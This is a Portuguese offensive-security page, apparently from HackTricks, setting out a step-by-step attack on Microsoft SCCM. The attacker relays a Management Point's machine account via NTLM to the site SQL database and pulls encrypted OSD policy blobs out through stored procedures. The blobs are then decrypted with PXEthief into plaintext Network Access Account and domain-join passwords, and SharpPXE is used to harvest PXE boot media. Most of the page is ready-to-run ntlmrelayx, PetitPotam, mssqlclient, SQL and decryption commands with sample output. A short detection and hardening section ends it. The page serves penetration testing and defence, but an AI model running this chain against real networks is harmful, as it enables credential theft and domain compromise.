# SCCM Management Point NTLM Relay to SQL – Extração de Secrets de OSD Policy

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Ao forçar um **System Center Configuration Manager (SCCM) Management Point (MP)** a realizar autenticação via SMB/RPC e fazer **relay** dessa conta de máquina NTLM para o **site database (MSSQL)**, você obtém direitos `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Essas roles permitem chamar um conjunto de stored procedures que expõem blobs de policy de **Operating System Deployment (OSD)** (credenciais de Network Access Account, variáveis de Task-Sequence etc.). Os blobs são codificados em hexadecimal/encriptados, mas podem ser decodificados e desencriptados com o **PXEthief**, resultando em secrets em plaintext.<sup>[[2]](#references)</sup>

Cadeia de alto nível:
1. Descubra o MP e o site DB ↦ endpoint HTTP não autenticado `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Inicie `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Force o MP usando **PetitPotam**, PrinterBug, DFSCoerce etc.
4. Através do proxy SOCKS, conecte-se com `mssqlclient.py -windows-auth` usando a conta **<DOMAIN>\\<MP-host>$** submetida ao relay.
5. Execute:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (ou `MP_GetPolicyBodyAfterAuthorization`)
6. Remova o BOM `0xFFFE`, use `xxd -r -p` → XML → `python3 pxethief.py 7 <hex>`.

Secrets como `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` etc. são recuperados sem interagir com PXE ou clients.<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. Enumerando endpoints de MP não autenticados
A extensão ISAPI do MP **GetAuth.dll** expõe vários parâmetros que não exigem autenticação (a menos que o site seja apenas PKI):<sup>[[1]](#references)</sup>

| Parâmetro | Finalidade |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Retorna a public key do certificado de assinatura do site + GUIDs dos dispositivos *x86* / *x64* **All Unknown Computers**. |
| `MPLIST` | Lista todos os Management-Points do site. |
| `SITESIGNCERT` | Retorna o certificado de assinatura do Primary-Site (identifica o site server sem LDAP). |

Obtenha os GUIDs que atuarão como **clientID** para as consultas posteriores ao DB:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Fazer relay da conta de máquina do MP para MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Quando a coerção for acionada, você deverá ver algo como:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Identifique as políticas OSD por meio de procedimentos armazenados
Conecte-se por meio do proxy SOCKS (porta 1080 por padrão):<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Mude para o DB **CM_<SiteCode>** (use o código de site de 3 dígitos, por exemplo, `CM_001`).

### 3.1  Encontrar GUIDs de Unknown-Computer (opcional)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Listar políticas atribuídas
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Cada linha contém `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.

Concentre-se nas policies:
* **NAAConfig**  – credenciais da Network Access Account
* **TS_Sequence** – variáveis da Task Sequence (OSDJoinAccount/Password)
* **CollectionSettings** – pode conter contas run-as

### 3.3  Recuperar o body completo
Se você já tiver `PolicyID` e `PolicyVersion`, pode ignorar o requisito de clientID usando:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> IMPORTANTE: No SSMS, aumente “Maximum Characters Retrieved” (>65535) ou o blob será truncado.

---

## 4. Decodificar e descriptografar o blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Exemplo de secrets recuperados:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Funções e procedimentos SQL relevantes
Após o relay, o login é mapeado para:<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Essas funções expõem dezenas de permissões EXEC; as principais usadas neste ataque são:

| Stored Procedure | Finalidade |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Lista as policies aplicadas a um `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Retorna o corpo completo da policy. |
| `MP_GetListOfMPsInSiteOSD` | Retornado pelo caminho `MPKEYINFORMATIONMEDIA`. |

Você pode inspecionar a lista completa com:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Coleta de mídias de boot PXE (SharpPXE)
* **Resposta PXE via UDP/4011**: envie uma solicitação de boot PXE para um Distribution Point configurado para PXE. A resposta do proxyDHCP revela caminhos de boot, como `SMSBoot\\x64\\pxe\\variables.dat` (configuração criptografada) e `SMSBoot\\x64\\pxe\\boot.bcd`, além de um blob de chave criptografado opcional.<sup>[[4]](#references)</sup>
* **Recupere os artefatos de boot via TFTP**: use os caminhos retornados para baixar `variables.dat` via TFTP (sem autenticação). O arquivo é pequeno (alguns KB) e contém as media variables criptografadas.
* **Descriptografe ou faça cracking**:
- Se a resposta incluir a chave de descriptografia, forneça-a ao **SharpPXE** para descriptografar `variables.dat` diretamente.
- Se nenhuma chave for fornecida (mídia PXE protegida por uma senha customizada), o SharpPXE gera um hash **compatível com o Hashcat** no formato `$sccm$aes128$...` para cracking offline. Após recuperar a senha, descriptografe o arquivo.
* **Analise o XML descriptografado**: as variáveis em plaintext contêm metadados de deployment do SCCM (**URL do Management Point**, **Site Code**, GUIDs da mídia e outros identificadores). O SharpPXE analisa esses dados e exibe um comando **SharpSCCM** pronto para execução, com os parâmetros de GUID/PFX/site preenchidos para o abuso subsequente.
* **Requisitos**: apenas conectividade de rede com o listener PXE (UDP/4011) e TFTP; não são necessários privilégios de administrador local.

---

## 7. Detecção e Hardening
1. **Monitore logins no MP** – qualquer conta de computador do MP fazendo login a partir de um IP que não seja o do seu host ≈ relay.<sup>[[1]](#references)</sup>
2. Habilite **Extended Protection for Authentication (EPA)** no banco de dados do site (`PREVENT-14`).
3. Desabilite NTLM não utilizado, exija SMB signing e restrinja RPC (
as mesmas mitigações usadas contra `PetitPotam`/`PrinterBug`).
4. Reforce a comunicação MP ↔ DB com IPSec / mutual-TLS.
5. **Restrinja a exposição do PXE** – limite UDP/4011 e TFTP a VLANs confiáveis usando o firewall, exija senhas PXE e gere alertas para downloads via TFTP de `SMSBoot\\*\\pxe\\variables.dat`.<sup>[[4]](#references)</sup>

---

## Consulte também
* Fundamentos de NTLM relay:

{{#ref}}
../ntlm/README.md
{{#endref}}

* Abuso de MSSQL e post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

## Referências
- [1] [Gostaria de falar com seu Manager: roubando secrets com Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 e ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)

{{#include ../../banners/hacktricks-training.md}}
